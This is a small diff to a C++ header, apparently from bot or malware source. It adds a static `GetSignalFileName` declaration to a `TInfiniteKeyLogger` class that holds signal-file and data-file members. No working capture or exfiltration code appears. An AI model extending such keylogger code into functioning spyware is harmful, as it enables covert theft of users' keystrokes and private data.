@@ -22,6 +22,8 @@ class TInfiniteKeyLogger : public TBotObject
 private:
 	string FSignalFile;
 	string FDataFile;
+
+	string static GetSignalFileName();
 public:
 	TInfiniteKeyLogger();
 	~TInfiniteKeyLogger();
